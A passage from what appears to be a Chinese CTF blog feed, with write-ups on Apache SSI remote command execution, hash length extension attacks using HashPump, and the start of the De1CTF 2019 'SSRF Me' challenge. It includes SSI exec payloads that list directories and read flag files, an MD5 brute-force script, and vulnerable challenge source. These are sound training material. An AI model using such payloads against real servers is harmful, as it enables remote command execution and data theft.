<span class="token variable">$file_shtml</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"public/"</span><span class="token operator">.</span><span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".shtml"</span><span class="token punctuation">;</span>            <span class="token variable">$shtml</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_shtml</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'            ***            ***            &lt;h1>Hello,'</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/h1>            ******'</span><span class="token punctuation">;</span>            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">**</span><span class="token operator">*</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"[!] Header  error ..."</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('[!] Failed')&lt;/script>"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span>    <span class="token punctuation">&#123;</span><span class="token operator">**</span><span class="token operator">*</span>    <span class="token punctuation">&#125;</span><span class="token operator">**</span><span class="token operator">*</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>代码逻辑：POST传参username不为空,且要绕过md5判断<code>$admin == substr(md5($_POST[&#39;password&#39;]),0,6)</code>,然后会打开一个随机名字的shtml文件将内容写入</li></ul><p>贴上md5绕过脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000000000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'6d0bc1'</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到2020666、2305004、9162671等password</p><hr><p>回显位$_POST[‘username’]为注入点利用SSI漏洞格式注入：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">\\查看当前目录<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token comment">#exec cmd="ls"--></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在请求头中发现回显url：<br><img src="/images/Apache-SSI%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.png"><br>访问url：<br><img src="/images/Apache-SSI%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.png"></p><hr><pre class="line-numbers language-php" data-language="php"><code class="language-php">\\访问上级目录<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token comment">#exec cmd="ls ../"--></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/Apache-SSI%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4.png"></p><hr><pre class="line-numbers language-php" data-language="php"><code class="language-php">\\抓取flag<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token comment">#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"--></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/Apache-SSI%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/5.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hash长度扩展攻击以及hashpump工具安装</title>
      <link href="/2023/08/04/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
      <url>/2023/08/04/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="hash长度扩展攻击"><a href="#hash长度扩展攻击" class="headerlink" title="hash长度扩展攻击"></a>hash长度扩展攻击</h1><hr><p>长度扩展攻击（length extension attack），是指针对某些允许包含额外信息的加密散列函数的攻击手段。对于满足以下条件的散列函数，都可以作为攻击对象：</p><ul><li><p>① 加密前将待加密的明文按一定规则填充到固定长度（例如512或1024比特）的倍数；</p></li><li><p>② 按照该固定长度，将明文分块加密，并用前一个块的加密结果，作为下一块加密的初始向量（Initial Vector）。</p></li></ul><p>满足上述要求的散列函数称为Merkle–Damgård散列函数（Merkle–Damgård hash function），下列散列函数都属于Merkle–Damgård散列函数：</p><pre class="line-numbers language-none"><code class="language-none">MD4MD5RIPEMD-160SHA-0SHA-1SHA-256SHA-512WHIRLPOOL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于H(salt+data)形式的加密，在以下条件满足的情况下，攻击者可以通过该方法获取H(salt+一定规则构造的data)：</p><ul><li><p>① 知道密文的加密算法且该算法满足Merkle–Damgård散列函数特征；</p></li><li><p>② 不知道salt，但知道salt的长度，并可控制data的值；</p></li><li><p>③ 可以得到一个H(salt+data)的值。</p></li></ul><p>简而言之，你要满足的条件就是：</p><p>知道salt的长度<br>知道salt+data的Hash值，并且data是你所知道的明文<br>这样你就能填充其他字符来得到一个和该salt+data计算出的hash值相同的一串字符串，整个过程你是不知道秘钥salt的。</p><h2 id="HashPump工具安装指令"><a href="#HashPump工具安装指令" class="headerlink" title="HashPump工具安装指令"></a>HashPump工具安装指令</h2><hr><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;bwall&#x2F;HashPumpapt-get install g++ libssl-devcd HashPumpmakemake install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x01-CTF题库-让我进去"><a href="#0x01-CTF题库-让我进去" class="headerlink" title="0x01 CTF题库-让我进去"></a>0x01 CTF题库-让我进去</h2><hr><p>做题链接：<a href="http://ctf5.shiyanbar.com/web/kzhan.php">http://ctf5.shiyanbar.com/web/kzhan.php</a></p><hr><p>随便输入数据用bp抓包发送到repeater，发现cookie有个source&#x3D;0，一般上这样的都可以更改，我们尝试将source&#x3D;1出现源码<br><img src="/images/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/1.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"XXXXXXXXXXXXXXXXXXXXXXX"</span><span class="token punctuation">;</span><span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"XXXXXXXXXXXXXXX"</span><span class="token punctuation">;</span> <span class="token comment">// This secret is 15 characters long for security!</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"getmein"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"getmein"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span> <span class="token operator">.</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">.</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Congratulations! You are a registered user.\n"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"The flag is "</span><span class="token operator">.</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"Your cookies don't match up! STOP HACKING THIS SITE."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"You are not an admin! LEAVE."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sample-hash"</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span> <span class="token operator">.</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"admin"</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"source"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"source"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"source"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span> <span class="token comment">// This source code is outputted here</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关键代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"getmein"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span> <span class="token operator">.</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">.</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用cookie传参getmein会等于后面的md5值就可以得到flag，我们已知的有：md5($secret+’adminadmin’)，密钥的长度，那么我们可以通过附加的字符串得到一个md5值和md5($secret+’admin’+’返回的字符串’)一样，那么我们只要输入这串返回的字符串，并且输入这个MD5就自然相等了。<br>利用hashpump工具来进行操作：</p><ul><li>$secret+’admin’加起来有20个字节（这里将$secret+’admin’看作新的secret变量），data为第二个admin，附加data为任意字符</li></ul><p><img src="/images/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/2.png"><br>如图自动生成payload和新的md5值，将\x全部换成%<br><img src="/images/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/3.png"></p><h2 id="0x02-De1CTF-2019-SSRF-Me"><a href="#0x02-De1CTF-2019-SSRF-Me" class="headerlink" title="0x02 [De1CTF 2019]SSRF Me"></a>0x02 [De1CTF 2019]SSRF Me</h2><hr><p>ps：这题主要是对python的代码审计经验不多、代码量又大、传参方式还不少导致挺难整的，对python代码的审计就直接给出<a href="https://blog.csdn.net/plant1234/article/details/123999788">大佬链接</a>了</p><hr><p>源码贴上：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/env python</span><span class="token comment"># #encoding=utf-8</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token keyword">import</span> socket<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> urllib<span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> json<span class="token builtin">reload</span><span class="token punctuation">(</span>sys<span class="token punctuation">)</span>sys<span class="token punctuation">.</span>setdefaultencoding<span class="token punctuation">(</span><span class="token string">'latin1'</span><span class="token punctuation">)</span> app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span> secert_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#是一个简单的赋值函数</span>        self<span class="token punctuation">.</span>action <span class="token operator">=</span> action        self<span class="token punctuation">.</span>param <span class="token operator">=</span> param        self<span class="token punctuation">.</span>sign <span class="token operator">=</span> sign        self<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> md5<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#如果没有该文件夹，则创立一个文件夹</span>            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span>     <span class="token keyword">def</span> <span class="token function">Exec</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>checkSign<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">"scan"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>                tmpfile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>   <span class="token comment">#注意w，可以对result.txt文件进行修改</span>                resp <span class="token operator">=</span> scan<span class="token punctuation">(</span>self<span class="token punctuation">.</span>param<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>resp <span class="token operator">==</span> <span class="token string">"Connection Timeout"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resp                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span> resp                    tmpfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp<span class="token punctuation">)</span><span class="token comment">#这个将resp中的数据写入result.txt中，可以利用为将flag.txt中的数据放进result.txt中</span>                    tmpfile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>            <span class="token keyword">if</span> <span class="token string">"read"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>                f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token comment">#打开方式为只读</span>                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#读取result.txt中的数据</span>            <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Action Error"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>            result<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Sign Error"</span>        <span class="token keyword">return</span> result     <span class="token keyword">def</span> <span class="token function">checkSign</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>getSign<span class="token punctuation">(</span>self<span class="token punctuation">.</span>action<span class="token punctuation">,</span> self<span class="token punctuation">.</span>param<span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>sign<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span> <span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/geneSign"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">geneSign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    action <span class="token operator">=</span> <span class="token string">"scan"</span>    <span class="token keyword">return</span> getSign<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span> <span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/De1ta'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#注意这个绑定，接下来的几个函数都很重要，这个相当于c语言里面的主函数，接下来是调用其他函数的过程</span><span class="token keyword">def</span> <span class="token function">challenge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    action <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#cookie传递action参数，对应不同的处理方式</span>    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#传递get方式的参数param</span>    sign <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#cookie传递sign参数sign</span>    ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr<span class="token comment">#获取请求端的ip地址</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>waf<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#调用waf函数进行过滤</span>        <span class="token keyword">return</span> <span class="token string">"No Hacker!!!!"</span>    task <span class="token operator">=</span> Task<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span> <span class="token comment">#创建Task类对象</span>    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>task<span class="token punctuation">.</span>Exec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#以json的形式返回到客户端</span> <span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"code.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>    socket<span class="token punctuation">.</span>setdefaulttimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token comment">#这个可以利用为访问flag.txt。读取然后为下一步将flag.txt文件中的东西放到result.txt中做铺垫</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Connection Timeout"</span> <span class="token keyword">def</span> <span class="token function">getSign</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#getSign的作用是拼接secret_key,param,action，然后返回拼接后的字符串的md5加密值</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>secert_key <span class="token operator">+</span> param <span class="token operator">+</span> action<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#将传入的字符串进行md5加密</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#防火墙的作用是判断开头的几个字母是否是gopher 或者是file  如果是的话，返回true</span>    check<span class="token operator">=</span>param<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"gopher"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">False</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">9999</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样secert_key+’fla